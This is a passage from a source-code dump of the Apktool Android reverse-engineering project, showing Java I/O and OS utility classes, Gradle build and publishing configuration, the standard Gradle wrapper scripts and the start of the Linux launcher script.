        return mDelegate.readChar();
    }

    public byte readByte() throws IOException {
        return mDelegate.readByte();
    }

    public boolean readBoolean() throws IOException {
        return mDelegate.readBoolean();
    }
}

```

`brut.j.util/src/main/java/brut/util/Duo.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.util;

import java.util.Objects;

public class Duo<T1, T2> {
    public final T1 m1;
    public final T2 m2;

    public Duo(T1 t1, T2 t2) {
        this.m1 = t1;
        this.m2 = t2;
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == null) {
            return false;
        }
        if (getClass() != obj.getClass()) {
            return false;
        }
        final Duo<T1, T2> other = (Duo<T1, T2>) obj;
        if (!Objects.equals(this.m1, other.m1)) {
            return false;
        }
        return Objects.equals(this.m2, other.m2);
    }

    @Override
    public int hashCode() {
        int hash = 3;
        hash = 71 * hash + (this.m1 != null ? this.m1.hashCode() : 0);
        hash = 71 * hash + (this.m2 != null ? this.m2.hashCode() : 0);
        return hash;
    }
}

```

`brut.j.util/src/main/java/brut/util/ExtDataInput.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.util;

import java.io.*;

public class ExtDataInput extends DataInputDelegate {
    public ExtDataInput(InputStream in) {
        this((DataInput) new DataInputStream(in));
    }

    public ExtDataInput(DataInput delegate) {
        super(delegate);
    }

    public int[] readIntArray(int length) throws IOException {
        int[] array = new int[length];
        for(int i = 0; i < length; i++) {
            array[i] = readInt();
        }
        return array;
    }

    public void skipInt() throws IOException {
        skipBytes(4);
    }

    public void skipCheckInt(int expected1, int expected2) throws IOException {
        int got = readInt();
        if (got != expected1 && got != expected2) {
            throw new IOException(String.format(
                "Expected: 0x%08x or 0x%08x, got: 0x%08x", expected1, expected2, got));
        }
    }

    public void skipCheckShort(short expected) throws IOException {
        short got = readShort();
        if (got != expected) {
            throw new IOException(String.format(
                "Expected: 0x%08x, got: 0x%08x", expected, got));
        }
    }

    public void skipCheckByte(byte expected) throws IOException {
        byte got = readByte();
        if (got != expected) {
            throw new IOException(String.format(
                    "Expected: 0x%08x, got: 0x%08x", expected, got));
        }
    }

    public void skipCheckChunkTypeInt(int expected, int possible) throws IOException {
        int got = readInt();

        if (got == possible || got < expected) {
            skipCheckChunkTypeInt(expected, -1);
        } else if (got != expected) {
            throw new IOException(String.format("Expected: 0x%08x, got: 0x%08x", expected, got));
        }
    }

    /**
     * The general contract of DataInput doesn't guarantee all the bytes requested will be skipped
     * and failure can occur for many reasons. We override this to try harder to skip all the bytes
     * requested (this is similar to DataInputStream's wrapper).
     */
    public final int skipBytes(int n) throws IOException {
        int total = 0;
        int cur;

        while ((total < n) && ((cur = super.skipBytes(n - total)) > 0)) {
            total += cur;
        }

        return total;
    }

    public String readNullEndedString(int length, boolean fixed)
            throws IOException {
        StringBuilder string = new StringBuilder(16);
        while(length-- != 0) {
            short ch = readShort();
            if (ch == 0) {
                break;
            }
            string.append((char) ch);
        }
        if (fixed) {
            skipBytes(length * 2);
        }

        return string.toString();
    }
}

```

`brut.j.util/src/main/java/brut/util/Jar.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.util;

import brut.common.BrutException;
import org.apache.commons.io.IOUtils;

import java.io.*;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ThreadLocalRandom;

public abstract class Jar {
    private static final Map<String, File> mExtracted = new HashMap<>();

    public static File getResourceAsFile(String name, Class<?> clazz) throws BrutException {
        File file = mExtracted.get(name);
        if (file == null) {
            file = extractToTmp(name, clazz);
            mExtracted.put(name, file);
        }
        return file;
    }

    public static File extractToTmp(String resourcePath, Class<?> clazz) throws BrutException {
        return extractToTmp(resourcePath, "brut_util_Jar_", clazz);
    }

    public static File extractToTmp(String resourcePath, String tmpPrefix, Class<?> clazz) throws BrutException {
        try {
            InputStream in = clazz.getResourceAsStream(resourcePath);
            if (in == null) {
                throw new FileNotFoundException(resourcePath);
            }
            long suffix = ThreadLocalRandom.current().nextLong();
            suffix = suffix == Long.MIN_VALUE ? 0 : Math.abs(suffix);
            File fileOut = File.createTempFile(tmpPrefix, suffix + ".tmp");
            fileOut.deleteOnExit();

            OutputStream out = new FileOutputStream(fileOut);
            IOUtils.copy(in, out);
            in.close();
            out.close();

            return fileOut;
        } catch (IOException ex) {
            throw new BrutException("Could not extract resource: " + resourcePath, ex);
        }
    }
}

```

`brut.j.util/src/main/java/brut/util/OS.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.util;

import brut.common.BrutException;
import org.apache.commons.io.IOUtils;

import java.io.*;
import java.util.Arrays;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.logging.Logger;

public class OS {

    private static final Logger LOGGER = Logger.getLogger("");

    public static void rmdir(File dir) throws BrutException {
        if (! dir.exists()) {
            return;
        }
        File[] files = dir.listFiles();
        if (files == null) {
            return;
        }

        for (File file : files) {
            if (file.isDirectory()) {
                rmdir(file);
            } else {
                file.delete();
            }
        }
        dir.delete();
    }

    public static void rmfile(String file) {
    	File del = new File(file);
    	del.delete();
    }

    public static void rmdir(String dir) throws BrutException {
        rmdir(new File(dir));
    }

    public static void cpdir(File src, File dest) throws BrutException {
        dest.mkdirs();
        File[] files = src.listFiles();
        if (files == null) {
            return;
        }

        for (File file : files) {
            File destFile = new File(dest.getPath() + File.separatorChar + file.getName());
            if (file.isDirectory()) {
                cpdir(file, destFile);
                continue;
            }
            try {
                try (InputStream in = new FileInputStream(file)) {
                    try (OutputStream out = new FileOutputStream(destFile)) {
                        IOUtils.copy(in, out);
                    }
                }
            } catch (IOException ex) {
                throw new BrutException("Could not copy file: " + file, ex);
            }
        }
    }

    public static void exec(String[] cmd) throws BrutException {
        Process ps;
        int exitValue;

        try {
            ProcessBuilder builder = new ProcessBuilder(cmd);
            ps = builder.start();

            new StreamForwarder(ps.getErrorStream(), "ERROR").start();
            new StreamForwarder(ps.getInputStream(), "OUTPUT").start();

            exitValue = ps.waitFor();
            if (exitValue != 0) {
                throw new BrutException("could not exec (exit code = " + exitValue + "): " + Arrays.toString(cmd));
            }
        } catch (IOException ex) {
            throw new BrutException("could not exec: " + Arrays.toString(cmd), ex);
        } catch (InterruptedException ex) {
            throw new BrutException("could not exec : " + Arrays.toString(cmd), ex);
        }
    }

    public static String execAndReturn(String[] cmd) {
        ExecutorService executor = Executors.newCachedThreadPool();
        try {
            ProcessBuilder builder = new ProcessBuilder(cmd);
            builder.redirectErrorStream(true);

            Process process = builder.start();
            StreamCollector collector = new StreamCollector(process.getInputStream());
            executor.execute(collector);

            process.waitFor();
            if (! executor.awaitTermination(15, TimeUnit.SECONDS)) {
                executor.shutdownNow();
                if (! executor.awaitTermination(5, TimeUnit.SECONDS)) {
                    System.err.println("Stream collector did not terminate.");
                }
            }
            return collector.get();
        } catch (IOException | InterruptedException e) {
            return null;
        }
    }

    public static File createTempDirectory() throws BrutException {
        try {
            File tmp = File.createTempFile("BRUT", null);
            tmp.deleteOnExit();
            if (!tmp.delete()) {
                throw new BrutException("Could not delete tmp file: " + tmp.getAbsolutePath());
            }
            if (!tmp.mkdir()) {
                throw new BrutException("Could not create tmp dir: " + tmp.getAbsolutePath());
            }
            return tmp;
        } catch (IOException ex) {
            throw new BrutException("Could not create tmp dir", ex);
        }
    }

    static class StreamForwarder extends Thread {

        StreamForwarder(InputStream is, String type) {
            mIn = is;
            mType = type;
        }

        @Override
        public void run() {
            try {
                BufferedReader br = new BufferedReader(new InputStreamReader(mIn));
                String line;
                while ((line = br.readLine()) != null) {
                    if (mType.equals("OUTPUT")) {
                        LOGGER.info(line);
                    } else {
                        LOGGER.warning(line);
                    }
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }

        private final InputStream mIn;
        private final String mType;
    }

    static class StreamCollector implements Runnable {
        private final StringBuilder buffer = new StringBuilder();
        private final InputStream inputStream;

        public StreamCollector(InputStream inputStream) {
            super();
            this.inputStream = inputStream;
        }

        @Override
        public void run() {
            String line;
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {
                while ((line = reader.readLine()) != null) {
                    buffer.append(line).append('\n');
                }
            } catch (IOException ignored) {}
        }

        public String get() {
            return buffer.toString();
        }
    }
}

```

`brut.j.util/src/main/java/brut/util/OSDetection.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.util;

public class OSDetection {
    private static final String OS = System.getProperty("os.name").toLowerCase();
    private static final String BIT = System.getProperty("sun.arch.data.model").toLowerCase();

    public static boolean isWindows() {
        return (OS.contains("win"));
    }

    public static boolean isMacOSX() {
        return (OS.contains("mac"));
    }

    public static boolean isUnix() {
        return (OS.contains("nix") || OS.contains("nux") || OS.contains("aix") || (OS.contains("sunos")));
    }

    public static boolean is64Bit() {
        if (isWindows()) {
            String arch = System.getenv("PROCESSOR_ARCHITECTURE");
            String wow64Arch = System.getenv("PROCESSOR_ARCHITEW6432");

            return arch != null && arch.endsWith("64") || wow64Arch != null && wow64Arch.endsWith("64");
        }
        return BIT.equalsIgnoreCase("64");
    }

    public static String returnOS() {
        return OS;
    }
}

```

`build.gradle`:

```gradle
import java.nio.charset.StandardCharsets

/**
 *  Copyright 2014 Ryszard Wiśniewski <brut.alll@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
buildscript {
    ext {
        depends = [
                baksmali       : 'org.smali:baksmali:2.5.2',
                commons_cli    : 'commons-cli:commons-cli:1.5.0',
                commons_io     : 'commons-io:commons-io:2.11.0',
                commons_lang   : 'org.apache.commons:commons-lang3:3.12.0',
                commons_text   : 'org.apache.commons:commons-text:1.9',
                guava          : 'com.google.guava:guava:31.0.1-jre',
                junit          : 'junit:junit:4.13.2',
                proguard_gradle: 'com.guardsquare:proguard-gradle:7.1.1',
                snakeyaml      : 'org.yaml:snakeyaml:1.29:android',
                smali          : 'org.smali:smali:2.5.2',
                xmlpull        : 'xpp3:xpp3:1.1.4c',
                xmlunit        : 'xmlunit:xmlunit:1.6',
        ]
    }

    repositories {
        mavenCentral()
        gradlePluginPortal()
    }
    dependencies {
        classpath "gradle.plugin.com.github.johnrengelman:shadow:7.1.0"
        classpath "gradle.plugin.com.hierynomus.gradle.plugins:license-gradle-plugin:0.16.1"
    }
}

apply from: 'gradle/functions.gradle'

version = '2.6.2'
def suffix = 'SNAPSHOT'

defaultTasks 'build', 'shadowJar', 'proguard'

allprojects {
    apply plugin: 'java'
    apply plugin: 'com.github.hierynomus.license'

    sourceCompatibility = JavaVersion.VERSION_1_8
    targetCompatibility = JavaVersion.VERSION_1_8

    license {
        header rootProject.file("brut.j.common/src/templates/apache2.0-header.txt")
        exclude "**/android/content/res/*.java"
        exclude "**/android/util/*.java"
        include "**/*.java"
        mapping {
            java = 'SLASHSTAR_STYLE'
        }
        ext {
            year = '2010'
            brut = 'Ryszard Wiśniewski'
            brutEmail = 'brut.alll@gmail.com'
            ibot = 'Connor Tumbleson'
            ibotEmail = 'connor.tumbleson@gmail.com'
        }
        strictCheck true
    }

    // license plugin automatically fires these tasks, disable them and run them during releases
    gradle.startParameter.excludedTaskNames += [
            "licenseMain",
            "licenseTest"
    ]
}

tasks.withType(JavaCompile).configureEach {
    options.encoding = StandardCharsets.UTF_8.toString()
    options.compilerArgs += ["-Xlint:-options"]
}

def mavenVersion = 'unspecified'
if (!('release' in gradle.startParameter.taskNames)) {
    def hash = getCheckedOutGitCommitHash()

    if (hash == null) {
        project.ext.set("hash", "dirty")
        project.ext.set("apktool_version", version + "-dirty")
        println "Building SNAPSHOT (no .git folder found)"
    } else {
        project.ext.set("hash", hash)
        project.ext.set("apktool_version", version + "-" + hash + "-SNAPSHOT")
        mavenVersion = version + "-SNAPSHOT"
        println "Building SNAPSHOT (${getCheckedOutBranch()}): $hash"
    }
} else {
    project.ext.set("hash", "")
    if (suffix.length() > 0) {
        project.ext.set("apktool_version", version + "-" + suffix)
    } else {
        project.ext.set("apktool_version", version)
    }
    mavenVersion = version
    println "Building RELEASE (${getCheckedOutBranch()}): $project.ext.apktool_version"
}

build.doFirst {
    def javaVersion = System.getProperty("java.version")

    // fail the build if java (1.5/1.6/1.7)
    if (javaVersion.startsWith("1.5") || javaVersion.startsWith("1.6") || javaVersion.startsWith("1.7")) {
        throw new GradleException("You can fix this problem!\n" +
                "We found a " + javaVersion + " JDK\n" +
                "Please update JAVA_HOME to use at least a 1.8 JDK\n" +
                "Currently it is set to: " + System.getProperty("java.home")
        )
    }
}

// used for official releases only. Please don't use
task release {
}

// used for publishing snapshot builds to maven.
task snapshot {
}

subprojects {
    apply plugin: 'java'

    repositories {
        mavenCentral()
    }

    test {
        testLogging {
            exceptionFormat = 'full'
        }
    }

    def mavenProjects = ['apktool-lib', 'apktool-cli', 'brut.j.common', 'brut.j.util', 'brut.j.dir']

    if (project.name in mavenProjects) {
        apply plugin: 'maven-publish'
        apply plugin: 'signing'

        publishing {
            publications {
                maven(MavenPublication) {
                    from project.components.java

                    groupId = 'org.apktool'
                    artifactId = project.name
                    version = mavenVersion

                    pom {
                        name = 'Apktool'
                        description = 'A tool for reverse engineering Android apk files.'
                        url = 'https://apktool.org'

                        licenses {
                            license {
                                name = 'The Apache License 2.0'
                                url = 'https://opensource.org/licenses/Apache-2.0'
                            }
                        }
                        developers {
                            developer {
                                id = 'iBotPeaches'
                                name = 'Connor Tumbleson'
                                email = 'connor.tumbleson@gmail.com'
                            }
                            developer {
                                id = 'brutall'
                                name = 'Ryszard Wiśniewski'
                                email = 'brut.alll@gmail.com'
                            }
                        }
                        scm {
                            connection = 'scm:git:git://github.com/iBotPeaches/Apktool.git'
                            developerConnection = 'scm:git:git@github.com:iBotPeaches/Apktool.git'
                            url = 'https://github.com/iBotPeaches/Apktool'
                        }
                    }
                }
            }
            if (rootProject.hasProperty('ossrhUsername') && rootProject.hasProperty('ossrhPassword')) {
                repositories {
                    maven {
                        if (mavenVersion.endsWith('-SNAPSHOT')) {
                            url = 'https://s01.oss.sonatype.org/content/repositories/snapshots/'
                        } else {
                            url = 'https://s01.oss.sonatype.org/service/local/staging/deploy/maven2/'
                        }
                        credentials {
                            username ossrhUsername
                            password ossrhPassword
                        }
                    }
                }
            }
        }

        signing {
            required { gradle.taskGraph.hasTask('publish') }
            sign(publishing.publications["maven"])
        }

        java {
            withJavadocJar()
            withSourcesJar()
        }

        tasks.getByPath(':release').dependsOn(publish)
        tasks.getByPath(':snapshot').dependsOn(publish)
    }
}

```

`gradle/functions.gradle`:

```gradle
import org.codehaus.groovy.runtime.MethodClosure

/**
 *  Copyright 2014 Ryszard Wiśniewski <brut.alll@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */

def getCheckedOutGitCommitHash() {
    def gitFolder = "$projectDir/.git/"
    def takeFromHash = 6

    def head
    try {
        head = new File(gitFolder + "HEAD").text.split(":")
    } catch(Exception ignored) {
        return null
    }

    def isCommit = head.length == 1
    if(isCommit) return head[0].trim().take(takeFromHash)

    def refHead = new File(gitFolder + head[1].trim())
    refHead.text.trim().take takeFromHash
}

def getCheckedOutBranch() {
    def gitFolder = "$projectDir/.git/"

    def head
    try {
        head = new File(gitFolder + "HEAD").text.split("/")
        return head[2].trim()
    } catch(Exception ignored) {
        return "SNAPSHOT"
    }
}

ext {
    getCheckedOutGitCommitHash = this.&getCheckedOutGitCommitHash as MethodClosure
    getCheckedOutBranch = this.&getCheckedOutBranch as MethodClosure
}

```

`gradle/wrapper/gradle-wrapper.properties`:

```properties
distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\://services.gradle.org/distributions/gradle-7.3.2-all.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists

```

`gradlew`:

```
#!/bin/sh

#
# Copyright © 2015-2021 the original authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

##############################################################################
#
#   Gradle start up script for POSIX generated by Gradle.
#
#   Important for running:
#
#   (1) You need a POSIX-compliant shell to run this script. If your /bin/sh is
#       noncompliant, but you have some other compliant shell such as ksh or
#       bash, then to run this script, type that shell name before the whole
#       command line, like:
#
#           ksh Gradle
#
#       Busybox and similar reduced shells will NOT work, because this script
#       requires all of these POSIX shell features:
#         * functions;
#         * expansions «$var», «${var}», «${var:-default}», «${var+SET}»,
#           «${var#prefix}», «${var%suffix}», and «$( cmd )»;
#         * compound commands having a testable exit status, especially «case»;
#         * various built-in commands including «command», «set», and «ulimit».
#
#   Important for patching:
#
#   (2) This script targets any POSIX shell, so it avoids extensions provided
#       by Bash, Ksh, etc; in particular arrays are avoided.
#
#       The "traditional" practice of packing multiple parameters into a
#       space-separated string is a well documented source of bugs and security
#       problems, so this is (mostly) avoided, by progressively accumulating
#       options in "$@", and eventually passing that to Java.
#
#       Where the inherited environment variables (DEFAULT_JVM_OPTS, JAVA_OPTS,
#       and GRADLE_OPTS) rely on word-splitting, this is performed explicitly;
#       see the in-line comments for details.
#
#       There are tweaks for specific operating systems such as AIX, CygWin,
#       Darwin, MinGW, and NonStop.
#
#   (3) This script is generated from the Groovy template
#       https://github.com/gradle/gradle/blob/master/subprojects/plugins/src/main/resources/org/gradle/api/internal/plugins/unixStartScript.txt
#       within the Gradle project.
#
#       You can find Gradle at https://github.com/gradle/gradle/.
#
##############################################################################

# Attempt to set APP_HOME

# Resolve links: $0 may be a link
app_path=$0

# Need this for daisy-chained symlinks.
while
    APP_HOME=${app_path%"${app_path##*/}"}  # leaves a trailing /; empty if no leading path
    [ -h "$app_path" ]
do
    ls=$( ls -ld "$app_path" )
    link=${ls#*' -> '}
    case $link in             #(
      /*)   app_path=$link ;; #(
      *)    app_path=$APP_HOME$link ;;
    esac
done

APP_HOME=$( cd "${APP_HOME:-./}" && pwd -P ) || exit

APP_NAME="Gradle"
APP_BASE_NAME=${0##*/}

# Add default JVM options here. You can also use JAVA_OPTS and GRADLE_OPTS to pass JVM options to this script.
DEFAULT_JVM_OPTS='"-Xmx64m" "-Xms64m"'

# Use the maximum available, or set MAX_FD != -1 to use that value.
MAX_FD=maximum

warn () {
    echo "$*"
} >&2

die () {
    echo
    echo "$*"
    echo
    exit 1
} >&2

# OS specific support (must be 'true' or 'false').
cygwin=false
msys=false
darwin=false
nonstop=false
case "$( uname )" in                #(
  CYGWIN* )         cygwin=true  ;; #(
  Darwin* )         darwin=true  ;; #(
  MSYS* | MINGW* )  msys=true    ;; #(
  NONSTOP* )        nonstop=true ;;
esac

CLASSPATH=$APP_HOME/gradle/wrapper/gradle-wrapper.jar


# Determine the Java command to use to start the JVM.
if [ -n "$JAVA_HOME" ] ; then
    if [ -x "$JAVA_HOME/jre/sh/java" ] ; then
        # IBM's JDK on AIX uses strange locations for the executables
        JAVACMD=$JAVA_HOME/jre/sh/java
    else
        JAVACMD=$JAVA_HOME/bin/java
    fi
    if [ ! -x "$JAVACMD" ] ; then
        die "ERROR: JAVA_HOME is set to an invalid directory: $JAVA_HOME

Please set the JAVA_HOME variable in your environment to match the
location of your Java installation."
    fi
else
    JAVACMD=java
    which java >/dev/null 2>&1 || die "ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH.

Please set the JAVA_HOME variable in your environment to match the
location of your Java installation."
fi

# Increase the maximum file descriptors if we can.
if ! "$cygwin" && ! "$darwin" && ! "$nonstop" ; then
    case $MAX_FD in #(
      max*)
        MAX_FD=$( ulimit -H -n ) ||
            warn "Could not query maximum file descriptor limit"
    esac
    case $MAX_FD in  #(
      '' | soft) :;; #(
      *)
        ulimit -n "$MAX_FD" ||
            warn "Could not set maximum file descriptor limit to $MAX_FD"
    esac
fi

# Collect all arguments for the java command, stacking in reverse order:
#   * args from the command line
#   * the main class name
#   * -classpath
#   * -D...appname settings
#   * --module-path (only if needed)
#   * DEFAULT_JVM_OPTS, JAVA_OPTS, and GRADLE_OPTS environment variables.

# For Cygwin or MSYS, switch paths to Windows format before running java
if "$cygwin" || "$msys" ; then
    APP_HOME=$( cygpath --path --mixed "$APP_HOME" )
    CLASSPATH=$( cygpath --path --mixed "$CLASSPATH" )

    JAVACMD=$( cygpath --unix "$JAVACMD" )

    # Now convert the arguments - kludge to limit ourselves to /bin/sh
    for arg do
        if
            case $arg in                                #(
              -*)   false ;;                            # don't mess with options #(
              /?*)  t=${arg#/} t=/${t%%/*}              # looks like a POSIX filepath
                    [ -e "$t" ] ;;                      #(
              *)    false ;;
            esac
        then
            arg=$( cygpath --path --ignore --mixed "$arg" )
        fi
        # Roll the args list around exactly as many times as the number of
        # args, so each arg winds up back in the position where it started, but
        # possibly modified.
        #
        # NB: a `for` loop captures its iteration list before it begins, so
        # changing the positional parameters here affects neither the number of
        # iterations, nor the values presented in `arg`.
        shift                   # remove old arg
        set -- "$@" "$arg"      # push replacement arg
    done
fi

# Collect all arguments for the java command;
#   * $DEFAULT_JVM_OPTS, $JAVA_OPTS, and $GRADLE_OPTS can contain fragments of
#     shell script including quotes and variable substitutions, so put them in
#     double quotes to make sure that they get re-expanded; and
#   * put everything else in single quotes, so that it's not re-expanded.

set -- \
        "-Dorg.gradle.appname=$APP_BASE_NAME" \
        -classpath "$CLASSPATH" \
        org.gradle.wrapper.GradleWrapperMain \
        "$@"

# Use "xargs" to parse quoted args.
#
# With -n1 it outputs one arg per line, with the quotes and backslashes removed.
#
# In Bash we could simply go:
#
#   readarray ARGS < <( xargs -n1 <<<"$var" ) &&
#   set -- "${ARGS[@]}" "$@"
#
# but POSIX shell has neither arrays nor command substitution, so instead we
# post-process each arg (as a line of input to sed) to backslash-escape any
# character that might be a shell metacharacter, then use eval to reverse
# that process (while maintaining the separation between arguments), and wrap
# the whole thing up as a single "set" statement.
#
# This will of course break if any of these variables contains a newline or
# an unmatched quote.
#

eval "set -- $(
        printf '%s\n' "$DEFAULT_JVM_OPTS $JAVA_OPTS $GRADLE_OPTS" |
        xargs -n1 |
        sed ' s~[^-[:alnum:]+,./:=@_]~\\&~g; ' |
        tr '\n' ' '
    )" '"$@"'

exec "$JAVACMD" "$@"

```

`gradlew.bat`:

```bat
@rem
@rem Copyright 2015 the original author or authors.
@rem
@rem Licensed under the Apache License, Version 2.0 (the "License");
@rem you may not use this file except in compliance with the License.
@rem You may obtain a copy of the License at
@rem
@rem      https://www.apache.org/licenses/LICENSE-2.0
@rem
@rem Unless required by applicable law or agreed to in writing, software
@rem distributed under the License is distributed on an "AS IS" BASIS,
@rem WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
@rem See the License for the specific language governing permissions and
@rem limitations under the License.
@rem

@if "%DEBUG%" == "" @echo off
@rem ##########################################################################
@rem
@rem  Gradle startup script for Windows
@rem
@rem ##########################################################################

@rem Set local scope for the variables with windows NT shell
if "%OS%"=="Windows_NT" setlocal

set DIRNAME=%~dp0
if "%DIRNAME%" == "" set DIRNAME=.
set APP_BASE_NAME=%~n0
set APP_HOME=%DIRNAME%

@rem Resolve any "." and ".." in APP_HOME to make it shorter.
for %%i in ("%APP_HOME%") do set APP_HOME=%%~fi

@rem Add default JVM options here. You can also use JAVA_OPTS and GRADLE_OPTS to pass JVM options to this script.
set DEFAULT_JVM_OPTS="-Xmx64m" "-Xms64m"

@rem Find java.exe
if defined JAVA_HOME goto findJavaFromJavaHome

set JAVA_EXE=java.exe
%JAVA_EXE% -version >NUL 2>&1
if "%ERRORLEVEL%" == "0" goto execute

echo.
echo ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH.
echo.
echo Please set the JAVA_HOME variable in your environment to match the
echo location of your Java installation.

goto fail

:findJavaFromJavaHome
set JAVA_HOME=%JAVA_HOME:"=%
set JAVA_EXE=%JAVA_HOME%/bin/java.exe

if exist "%JAVA_EXE%" goto execute

echo.
echo ERROR: JAVA_HOME is set to an invalid directory: %JAVA_HOME%
echo.
echo Please set the JAVA_HOME variable in your environment to match the
echo location of your Java installation.

goto fail

:execute
@rem Setup the command line

set CLASSPATH=%APP_HOME%\gradle\wrapper\gradle-wrapper.jar


@rem Execute Gradle
"%JAVA_EXE%" %DEFAULT_JVM_OPTS% %JAVA_OPTS% %GRADLE_OPTS% "-Dorg.gradle.appname=%APP_BASE_NAME%" -classpath "%CLASSPATH%" org.gradle.wrapper.GradleWrapperMain %*

:end
@rem End local scope for the variables with windows NT shell
if "%ERRORLEVEL%"=="0" goto mainEnd

:fail
rem Set variable GRADLE_EXIT_CONSOLE if you need the _script_ return code instead of
rem the _cmd.exe /c_ return code!
if  not "" == "%GRADLE_EXIT_CONSOLE%" exit 1
exit /b 1

:mainEnd
if "%OS%"=="Windows_NT" endlocal

:omega

```

`scripts/linux/apktool`:

```
#!/bin/bash
#
# Copyright (C) 2007 The Android Open Source Project
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# This script is a wrapper for smali.jar, so you can simply call "smali",
# instead of java -jar smali.jar. It is heavily based on the "dx" script
# from the Android SDK

# Set up prog to be the path of this script, including following symlinks,
# and set up progdir to be the fully-qualified pathname of its directory.
prog="$0"
while [ -h "${prog}" ]; do
    newProg=`/bin/ls -ld "${prog}"`

    newProg=`expr "${newProg}" : ".* -> \(.*\)$"`
    if expr "x${newProg}" : 'x/' >/dev/null; then
        prog="${newProg}"
    else
        progdir=`dirname "${prog}"`
        prog="${progdir}/${newProg}"
    fi
done
oldwd=`pwd`
progdir=`dirname "${prog}"`
cd "${progdir}"
progdir=`pwd`
prog="${progdir}"/`basename "${prog}"`
cd "${oldwd}"

jarfile=apktool.jar
libdir="$progdir"
if [ ! -r "$libdir/$jarfile" ]
then
    echo `basename "$prog"`": can't find $jarfile"
    exit 1
fi

javaOpts=""

